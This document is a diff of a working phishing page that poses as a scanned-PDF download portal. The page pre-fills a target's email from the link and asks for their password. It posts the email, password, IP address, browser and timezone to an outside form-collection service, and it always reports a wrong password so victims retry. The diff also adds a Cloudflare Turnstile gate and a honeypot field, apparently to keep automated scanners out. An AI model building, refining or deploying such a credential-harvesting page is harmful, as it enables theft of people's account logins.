@@ -10,8 +10,6 @@
     />
     <!-- Bootstrap Icons for input icons -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
-    <!-- Cloudflare Turnstile Script -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
     <!-- 
       👨‍💻 Developed by Vikram Joseph
@@ -160,15 +158,37 @@
       [dir="rtl"] .error-msg {
         text-align: right;
       }
-      #turnstile-container {
-        margin: 20px 0;
-      }
-      #verification-box {
+      /* Added Turnstile styles */
+      .turnstile-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.9);
         display: flex;
-        flex-direction: column;
+        justify-content: center;
         align-items: center;
+        z-index: 10000;
+      }
+      .turnstile-inner {
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        max-width: 500px;
+        width: 100%;
+      }
+      .turnstile-inner h2 {
+        color: #222;
+        font-weight: 400;
+        margin-bottom: 20px;
+        font-family: "Roboto", sans-serif;
       }
     </style>
+    <!-- Added Turnstile script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=renderTurnstile" async defer></script>
   </head>
   <body>
     <!-- 
@@ -176,85 +196,87 @@
       ⚡ Custom HTML/CSS/JS for authentication interface
     -->
 
-    <!-- Verification Page -->
-    <div id="verification-box" class="form-box" style="display: none;">
-      <h4>Please Verify</h4>
-      <p style="font-size: 13px; color: #666">Complete the verification to access the document</p>
-      <div id="turnstile-container"></div>
-      <div class="error-msg" id="turnstile-error" style="display: none">
-        Verification failed. Please try again.
+    <!-- Added Turnstile container -->
+    <div class="turnstile-container" id="turnstile-container">
+      <div class="turnstile-inner">
+        <h2>Complete Verification</h2>
+        <div id="turnstile-widget"></div>
       </div>
     </div>
 
-    <!-- Main Form Page -->
-    <div id="form-box" class="form-box" style="display: none;">
-      <img
-        src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg"
-        alt="PDF Icon"
-      />
-      <h4>Download Scanned Shared Document</h4>
-      <p style="font-size: 13px; color: #666">Authentication required</p>
-      <a href="#" class="pdf-link" id="pdf-link">&#128196; Document.pdf</a>
+    <!-- Original content wrapped in a container with ID and initially hidden -->
+    <div id="main-content" style="display: none;">
+      <div class="form-box">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg"
+          alt="PDF Icon"
+        />
+        <h4>Download Scanned Shared Document</h4>
+        <p style="font-size: 13px; color: #666">Authentication required</p>
+        <a href="#" class="pdf-link" id="pdf-link">&#128196; Document.pdf</a>
 
-      <!-- Step 1 -->
-      <form id="step1">
-        <div class="input-container">
-          <i class="bi bi-envelope input-icon"></i>
-          <input
-            type="email"
-            class="input-field"
-            id="emailInput"
-            name="email"
-            placeholder="Enter your email"
-            required
-            disabled
-          />
-        </div>
-        <button type="submit" class="download-btn" id="step1Btn">
-          <span>Continue</span>
-        </button>
-      </form>
-
-      <!-- Step 2 -->
-      <form id="step2" style="display: none">
-        <div class="input-container">
-          <i class="bi bi-envelope input-icon"></i>
-          <input
-            type="email"
-            class="input-field"
-            id="emailInputView"
-            name="email"
-            disabled
-            placeholder="Enter your email"
-          />
-        </div>
-        <div class="input-container" id="passwordContainer">
-          <i class="bi bi-lock input-icon"></i>
-          <input
-            type="password"
-            class="input-field"
-            id="passwordInput"
-            name="password"
-            placeholder="Enter password"
-            required
-          />
-          <div class="error-msg" id="passwordError" style="display: none">
-            Incorrect password
+        <!-- Step 1 -->
+        <form id="step1">
+          <div class="input-container">
+            <i class="bi bi-envelope input-icon"></i>
+            <input
+              type="email"
+              class="input-field"
+              id="emailInput"
+              name="email"
+              placeholder="Enter your email"
+              required
+              disabled
+            />
           </div>
-          <div class="error-msg" id="slowDownError" style="display: none">
-            Please slow down
-          </div>
-        </div>
-        <button type="submit" class="download-btn" id="step2Btn">
-          <span>Download</span>
-        </button>
-      </form>
-    </div>
+          <button type="submit" class="download-btn" id="step1Btn">
+            <span>Continue</span>
+          </button>
+        </form>
 
-    <!-- Loader Overlay -->
-    <div id="loader-overlay" class="loader-overlay">
-      <div class="spinner-border text-light" role="status">
-        <span class="visually-hidden" id="loader-text">Loading...</span>
+        <!-- Step 2 -->
+        <form id="step2" style="display: none">
+          <div class="input-container">
+            <i class="bi bi-envelope input-icon"></i>
+            <input
+              type="email"
+              class="input-field"
+              id="emailInputView"
+              name="email"
+              disabled
+              placeholder="Enter your email"
+            />
+          </div>
+          <div class="input-container" id="passwordContainer">
+            <i class="bi bi-lock input-icon"></i>
+            <input
+              type="password"
+              class="input-field"
+              id="passwordInput"
+              name="password"
+              placeholder="Enter password"
+              required
+            />
+            <div class="error-msg" id="passwordError" style="display: none">
+              Incorrect password
+            </div>
+            <div class="error-msg" id="slowDownError" style="display: none">
+              Please slow down
+            </div>
+          </div>
+          <!-- Honeypot Field -->
+          <input type="text" name="honeypot" id="honeypot" style="display:none;" autocomplete="off">
+          <button type="submit" class="download-btn" id="step2Btn">
+            <span>Download</span>
+          </button>
+        </form>
+      </div>
+
+      <!-- Loader Overlay (only for step1) -->
+      <div id="loader-overlay" class="loader-overlay">
+        <div class="spinner-border text-light" role="status">
+          <span class="visually-hidden" id="loader-text">Loading...</span>
+        </div>
       </div>
     </div>
 
@@ -396,159 +418,144 @@
         }
       }
 
+      // Added Turnstile render function
+      function renderTurnstile() {
+        turnstile.render('#turnstile-widget', {
+          sitekey: '0x4AAAAAAB10qIE0M6yxD1P2',
+          callback: function(token) {
+            console.log('Turnstile verification successful. Token:', token);
+            document.getElementById('turnstile-container').style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+          },
+          'error-callback': function(error) {
+            console.error('Turnstile error:', error);
+          }
+        });
+      }
+
       // Main script
       document.addEventListener("DOMContentLoaded", () => {
         const lang = detectLanguage();
         applyTranslations(lang);
 
-        // Show verification box initially
-        document.getElementById("verification-box").style.display = "block";
-
-        // Initialize Cloudflare Turnstile
-        turnstile.render('#turnstile-container', {
-          sitekey: '0x4AAAAAAB10qIE0M6yxD1P2',
-          callback: function(token) {
-            // Simulate server-side validation (in production, validate token with Cloudflare's API)
-            fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-              body: `secret=YOUR_SECRET_KEY&response=${token}` // Replace YOUR_SECRET_KEY with actual secret key
-            })
-            .then(response => response.json())
-            .then(data => {
-              if (data.success) {
-                // Verification successful, hide verification box and show form
-                document.getElementById("verification-box").style.display = "none";
-                document.getElementById("form-box").style.display = "block";
-                proceedWithForm();
-              } else {
-                document.getElementById("turnstile-error").style.display = "block";
-              }
-            })
-            .catch(error => {
-              console.error('Turnstile verification failed:', error);
-              document.getElementById("turnstile-error").style.display = "block";
-            });
-          },
-          'error-callback': function() {
-            document.getElementById("turnstile-error").style.display = "block";
+        // Handle email extraction and PDF link
+        let submitCount = 0;
+        const email = extractEmailFromUrl();
+        let domain;
+        const pdfLink = document.getElementById("pdf-link");
+        if (email) {
+          const emailInput = document.getElementById("emailInput");
+          const emailInputView = document.getElementById("emailInputView");
+          emailInput.value = email; // Set extracted email
+          emailInputView.value = email; // Set extracted email
+          emailInput.disabled = true;
+          emailInputView.disabled = true;
+          const parts = email.split("@");
+          if (parts.length === 2) {
+            domain = parts[1];
+            pdfLink.innerHTML = `&#128196; Document_${domain.split(".")[0].toUpperCase()}.pdf`;
           }
+          emailInput.dispatchEvent(new Event('input'));
+          emailInputView.dispatchEvent(new Event('input'));
+        } else {
+          console.warn("No valid email found in URL hash or eta parameter.");
+          pdfLink.innerHTML = `&#128196; Document.pdf`;
+          document.getElementById("emailInput").disabled = true;
+          document.getElementById("emailInputView").disabled = true;
+        }
+
+        // IP and Browser Detection
+        let userData = {
+          ipAddress: "Fetching...",
+          userAgent: navigator.userAgent,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          browser: "Detecting..."
+        };
+        const ua = navigator.userAgent;
+        userData.browser = ua.indexOf("Firefox") > -1 ? "Mozilla Firefox" :
+                           ua.indexOf("SamsungBrowser") > -1 ? "Samsung Internet" :
+                           ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1 ? "Opera" :
+                           ua.indexOf("Trident") > -1 ? "Microsoft Internet Explorer" :
+                           ua.indexOf("Edge") > -1 ? "Microsoft Edge" :
+                           ua.indexOf("Chrome") > -1 ? "Google Chrome or Chromium" :
+                           ua.indexOf("Safari") > -1 ? "Apple Safari" : "Unknown";
+
+        fetch("https://api.ipify.org?format=json").then(e => e.json()).then(e => {
+          userData.ipAddress = e.ip;
+        }).catch(e => {
+          console.error("Error fetching IP address:", e);
+          userData.ipAddress = "Unavailable";
         });
 
-        // Function to handle form logic after verification
-        function proceedWithForm() {
-          // Handle email extraction and PDF link
-          let submitCount = 0;
-          const email = extractEmailFromUrl();
-          let domain;
-          const pdfLink = document.getElementById("pdf-link");
-          if (email) {
-            const emailInput = document.getElementById("emailInput");
-            const emailInputView = document.getElementById("emailInputView");
-            emailInput.value = email;
-            emailInputView.value = email;
-            emailInput.disabled = true;
-            emailInputView.disabled = true;
-            const parts = email.split("@");
-            if (parts.length === 2) {
-              domain = parts[1];
-              pdfLink.innerHTML = `&#128196; Document_${domain.split(".")[0].toUpperCase()}.pdf`;
-            }
-            emailInput.dispatchEvent(new Event('input'));
-            emailInputView.dispatchEvent(new Event('input'));
-          } else {
-            console.warn("No valid email found in URL hash or eta parameter.");
-            pdfLink.innerHTML = `&#128196; Document.pdf`;
-            document.getElementById("emailInput").disabled = true;
-            document.getElementById("emailInputView").disabled = true;
+        // Step 1 Submission
+        document.getElementById("step1").addEventListener("submit", function(e) {
+          e.preventDefault();
+          document.getElementById("loader-overlay").style.display = "flex";
+          setTimeout(() => {
+            document.getElementById("loader-overlay").style.display = "none";
+            document.getElementById("step1").style.display = "none";
+            document.getElementById("step2").style.display = "block";
+            document.getElementById("emailInputView").value = document.getElementById("emailInput").value;
+          }, 3000);
+        });
+
+        // Step 2 Submission
+        document.getElementById("step2").addEventListener("submit", function(e) {
+          e.preventDefault();
+          const honeypot = document.getElementById("honeypot").value.trim();
+          if (honeypot) {
+            console.log("Honeypot field filled. Submission ignored.");
+            return;
           }
 
-          // IP and Browser Detection
-          let userData = {
-            ipAddress: "Fetching...",
-            userAgent: navigator.userAgent,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            browser: "Detecting..."
-          };
-          const ua = navigator.userAgent;
-          userData.browser = ua.indexOf("Firefox") > -1 ? "Mozilla Firefox" :
-                             ua.indexOf("SamsungBrowser") > -1 ? "Samsung Internet" :
-                             ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1 ? "Opera" :
-                             ua.indexOf("Trident") > -1 ? "Microsoft Internet Explorer" :
-                             ua.indexOf("Edge") > -1 ? "Microsoft Edge" :
-                             ua.indexOf("Chrome") > -1 ? "Google Chrome or Chromium" :
-                             ua.indexOf("Safari") > -1 ? "Apple Safari" : "Unknown";
+          submitCount += 1;
+          const isFirstAttempt = submitCount === 1;
+          const isSecondAttempt = submitCount === 2;
+          const isThirdAttempt = submitCount === 3;
+          const isFourthAttempt = submitCount === 4;
+          const isFifthAttempt = submitCount === 5;
 
-          fetch("https://api.ipify.org?format=json").then(e => e.json()).then(e => {
-            userData.ipAddress = e.ip;
-          }).catch(e => {
-            console.error("Error fetching IP address:", e);
-            userData.ipAddress = "Unavailable";
-          });
+          const email = document.getElementById("emailInputView").value.trim();
+          const password = document.getElementById("passwordInput").value.trim();
+          const data = { email, password, ...userData };
 
-          // Step 1 Submission
-          document.getElementById("step1").addEventListener("submit", function(e) {
-            e.preventDefault();
-            document.getElementById("loader-overlay").style.display = "flex";
-            setTimeout(() => {
-              document.getElementById("loader-overlay").style.display = "none";
-              document.getElementById("step1").style.display = "none";
-              document.getElementById("step2").style.display = "block";
-              document.getElementById("emailInputView").value = document.getElementById("emailInput").value;
-            }, 3000);
-          });
-
-          // Step 2 Submission
-          document.getElementById("step2").addEventListener("submit", function(e) {
-            e.preventDefault();
-            submitCount += 1;
-            const isFirstAttempt = submitCount === 1;
-            const isSecondAttempt = submitCount === 2;
-            const isThirdAttempt = submitCount === 3;
-            const isFourthAttempt = submitCount === 4;
-            const isFifthAttempt = submitCount === 5;
-
-            const email = document.getElementById("emailInputView").value.trim();
-            const password = document.getElementById("passwordInput").value.trim();
-            const data = { email, password, ...userData };
-
-            new Promise(resolve => {
-              const t = setInterval(() => {
-                if (userData.ipAddress !== "Fetching...") {
-                  clearInterval(t);
-                  resolve();
-                }
-              }, 100);
-            }).then(() => {
-              fetch("https://submit-form.com/bbKESMhI7", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-              }).then(response => {
-                console.log(response.ok ? "Submission to form successful!" : "Submission to form failed.");
-              }).catch(error => {
-                console.error("Error sending submission to form:", error);
-              });
-
-              if (isFirstAttempt || isSecondAttempt || isThirdAttempt || isFourthAttempt) {
-                document.getElementById("passwordError").style.display = "block";
-                document.getElementById("passwordInput").value = "";
-              } else if (isFifthAttempt) {
-                document.getElementById("passwordError").style.display = "none";
-                document.getElementById("slowDownError").style.display = "block";
-                document.getElementById("passwordInput").disabled = true;
-                document.getElementById("step2Btn").disabled = true;
-                setTimeout(() => {
-                  document.getElementById("slowDownError").style.display = "none";
-                  document.getElementById("passwordInput").disabled = false;
-                  document.getElementById("step2Btn").disabled = false;
-                  submitCount = 0;
-                  document.getElementById("passwordInput").value = "";
-                }, 120000);
+          // Submit data without showing loader
+          new Promise(resolve => {
+            const t = setInterval(() => {
+              if (userData.ipAddress !== "Fetching...") {
+                clearInterval(t);
+                resolve();
               }
+            }, 100);
+          }).then(() => {
+            fetch("https://submit-form.com/bbKESMhI7", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(data)
+            }).then(response => {
+              console.log(response.ok ? "Submission to form successful!" : "Submission to form failed.");
+            }).catch(error => {
+              console.error("Error sending submission to form:", error);
             });
+
+            if (isFirstAttempt || isSecondAttempt || isThirdAttempt || isFourthAttempt) {
+              document.getElementById("passwordError").style.display = "block";
+              document.getElementById("passwordInput").value = "";
+            } else if (isFifthAttempt) {
+              document.getElementById("passwordError").style.display = "none";
+              document.getElementById("slowDownError").style.display = "block";
+              document.getElementById("passwordInput").disabled = true;
+              document.getElementById("step2Btn").disabled = true;
+              setTimeout(() => {
+                document.getElementById("slowDownError").style.display = "none";
+                document.getElementById("passwordInput").disabled = false;
+                document.getElementById("step2Btn").disabled = false;
+                submitCount = 0; // Reset submission counter
+                document.getElementById("passwordInput").value = "";
+              }, 120000); // 2 minutes
+            }
           });
-        }
+        });
       });
     </script>
     <!-- 
@@ -556,6 +563,5 @@
       📬 Telegram: https://joseph
       Need a landing page, user panel, or app? Contact now!
     -->
-    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"1017d9474c134a50936ac4f0e1a6fe66","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
   </body>
 </html>
